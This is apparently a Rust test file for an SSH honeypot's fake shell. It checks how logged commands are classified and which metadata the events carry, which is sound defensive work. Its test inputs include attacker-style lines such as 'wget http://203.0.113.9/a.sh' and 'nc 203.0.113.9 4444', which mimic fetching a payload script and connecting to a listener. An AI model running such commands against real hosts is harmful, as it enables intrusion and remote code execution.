//! The coverage fields on the command_exec event: `classification`, `command_basename`,
//! `status`, `persona` and `emulator_version`. They are derived from the line trace, ride on the
//! evidence event only, and are absent from the flood markers.

use super::SensorEvent;
use super::trace::{CommandTrace, SegmentTrace};
use super::{
    BudgetHit, CommandClass, EmitContext, FakeShell, HandlerId, LineTrace, ParseNode, RunDecision,
    UnsupportedKind,
};
use crate::fakefs::FakeFs;

fn ctx() -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: "ssh".to_string(),
        session_id: None,
    }
}

fn shell() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx())
}

fn android() -> FakeShell {
    FakeShell::android(FakeFs::android(), ctx())
}

fn exec_event(events: &[SensorEvent]) -> &SensorEvent {
    events.first().expect("the line emitted an event")
}

fn class_of(sh: &mut FakeShell, line: &str) -> String {
    let (_, events) = sh.handle_input(line);
    exec_event(&events).metadata["classification"]
        .as_str()
        .unwrap_or_else(|| panic!("{line:?} carried no classification"))
        .to_string()
}

#[test]
fn a_modeled_command_is_supported() {
    let mut sh = shell();
    for line in [
        "id",
        "whoami",
        "echo a | cat",
        "busybox echo hi",
        "cd /tmp && pwd",
    ] {
        assert_eq!(class_of(&mut sh, line), "supported", "{line}");
    }
}

#[test]
fn a_command_with_no_handler_is_unknown() {
    let mut sh = shell();
    for line in [
        "definitelynotacommand",
        // The gap is in a later segment, a pipeline stage and a nested script, not the first word.
        "echo hi && definitelynotacommand",
        "echo hi | definitelynotacommand",
        "sh -c \"definitelynotacommand\"",
        // A path with nothing to run exits 127, and so does a busybox applet it does not list.
        "/tmp/definitely-not-here",
        "busybox PROBEX",
    ] {
        assert_eq!(class_of(&mut sh, line), "unknown", "{line}");
    }
    assert_eq!(class_of(&mut android(), "enable"), "unknown");
}

#[test]
fn a_path_that_exists_but_cannot_run_is_not_a_gap() {
    let mut sh = shell();
    // A directory is not executable: bash answers 126 "Is a directory", a modeled outcome.
    let (_, events) = sh.handle_input("/tmp");
    let meta = &exec_event(&events).metadata;
    assert_eq!(meta["status"], 126);
    assert_eq!(meta["classification"], "supported");
}

#[test]
fn canned_and_unsupported_lines_are_partial() {
    let mut sh = shell();
    for line in [
        "wget -q http://203.0.113.9/x",
        "curl http://203.0.113.9/x",
        "echo hi; [[ -f /etc/hostname ]]",
    ] {
        assert_eq!(class_of(&mut sh, line), "partial", "{line}");
    }
    let mut sh = android();
    for line in [
        "nc 203.0.113.9 4444",
        "getenforce",
        "pm list packages",
        "dumpsys battery",
        "logcat -d",
    ] {
        assert_eq!(class_of(&mut sh, line), "partial", "{line}");
    }
}

#[test]
fn a_line_that_trips_a_budget_cap_is_parse_limit() {
    let mut sh = shell();
    let line = "i=0; while :; do i=$((i+1)); if :; then :; fi; done";
    assert_eq!(class_of(&mut sh, line), "parse_limit");
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Work));
}

#[test]
fn the_event_carries_basename_status_persona_and_version() {
    let mut sh = shell();
    let (_, events) = sh.handle_input("/usr/bin/id");
    let meta = &exec_event(&events).metadata;
    assert_eq!(meta["command_basename"], "id");
    assert_eq!(meta["status"], 0);
    assert_eq!(meta["persona"], "ubuntu");
    assert_eq!(meta["emulator_version"], env!("CARGO_PKG_VERSION"));
    assert!(!meta["emulator_version"].as_str().unwrap().is_empty());
    // Existing keys are untouched.
    assert_eq!(meta["command"], "/usr/bin/id");
    assert_eq!(meta["protocol_label"], "ssh");

    // The status is the line's last command's, and the basename is the first command's.
    let (_, events) = sh.handle_input("whoami; nosuchcmd");
    let meta = &exec_event(&events).metadata;
    assert_eq!(meta["command_basename"], "whoami");
    assert_eq!(meta["status"], 127);

    // A pipeline has no program token of its own: the first stage names it.
    let (_, events) = sh.handle_input("echo a | cat");
    assert_eq!(exec_event(&events).metadata["command_basename"], "echo");

    let (_, events) = android().handle_input("getenforce");
    let meta = &exec_event(&events).metadata;
    assert_eq!(meta["persona"], "android");
    assert_eq!(meta["command_basename"], "getenforce");
}

#[test]
fn a_line_with_no_program_has_no_basename() {
    let mut sh = shell();
    let (_, events) = sh.handle_input(">/tmp/x");
    let meta = &exec_event(&events).metadata;
    assert!(meta.get("command_basename").is_none(), "{meta}");
    assert_eq!(meta["classification"], "supported");
}

#[test]
fn only_the_command_event_is_classified_and_order_is_kept() {
    let mut sh = shell();
    let (_, events) = sh.handle_input("wget http://203.0.113.9/a.sh");
    assert_eq!(events.len(), 2);
    assert_eq!(events[0].signal_type, "honeypot_command_exec");
    assert_eq!(events[0].metadata["classification"], "partial");
    assert_eq!(events[1].signal_type, "honeypot_file_download");
    assert!(events[1].metadata.get("classification").is_none());
}

#[test]
fn flood_markers_carry_no_classification() {
    let mut sh = shell();
    let (_, events) = sh.handle_input("\u{1}\u{2}\u{3}\u{4}\u{5}");
    assert_eq!(events[0].metadata["flood"], "binary");
    for key in ["classification", "persona", "emulator_version", "status"] {
        assert!(
            events[0].metadata.get(key).is_none(),
            "binary marker has {key}"
        );
    }

    let mut sh = shell();
    for _ in 0..256 {
        sh.handle_input("true");
    }
    let (_, events) = sh.handle_input("true");
    assert_eq!(events[0].metadata["flood"], "command_cap");
    for key in ["classification", "persona", "emulator_version", "status"] {
        assert!(
            events[0].metadata.get(key).is_none(),
            "cap marker has {key}"
        );
    }
}

fn command(resolved: HandlerId, status: u8) -> CommandTrace {
    let mut c = CommandTrace::open(&["x"], ParseNode::Simple, resolved);
    c.status = status;
    c
}

fn line_of(commands: Vec<CommandTrace>) -> LineTrace {
    LineTrace {
        segments: commands
            .into_iter()
            .map(|c| SegmentTrace {
                op: super::ControlOp::Seq,
                decision: RunDecision::Ran,
                command: Some(c),
            })
            .collect(),
        ..LineTrace::default()
    }
}

#[test]
fn classify_precedence_is_parse_limit_unknown_partial_supported() {
    let supported = || command(HandlerId::Id, 0);
    let partial = || command(HandlerId::Wget, 0);
    let unknown = || command(HandlerId::NotFound, 127);

    assert_eq!(line_of(vec![]).classify(), CommandClass::Supported);
    assert_eq!(
        line_of(vec![supported()]).classify(),
        CommandClass::Supported
    );
    assert_eq!(
        line_of(vec![supported(), partial()]).classify(),
        CommandClass::Partial
    );
    assert_eq!(
        line_of(vec![partial(), unknown(), supported()]).classify(),
        CommandClass::Unknown
    );

    let mut trace = line_of(vec![partial(), unknown()]);
    trace.budget.hit = Some(BudgetHit::Depth);
    assert_eq!(trace.classify(), CommandClass::ParseLimit);

    // Nesting counts: a not-found command under a supported parent, and an unsupported skip.
    let mut parent = supported();
    parent.reentry.push(unknown());
    assert_eq!(line_of(vec![parent]).classify(), CommandClass::Unknown);
    let mut skipped = CommandTrace::open(&[], ParseNode::Unsupported, HandlerId::Compound);
    skipped.unsupported = Some(UnsupportedKind::DoubleBracket);
    assert_eq!(line_of(vec![skipped]).classify(), CommandClass::Partial);
}

#[test]
fn class_words_are_stable() {
    assert_eq!(CommandClass::Supported.as_str(), "supported");
    assert_eq!(CommandClass::Partial.as_str(), "partial");
    assert_eq!(CommandClass::Unknown.as_str(), "unknown");
    assert_eq!(CommandClass::ParseLimit.as_str(), "parse_limit");
}
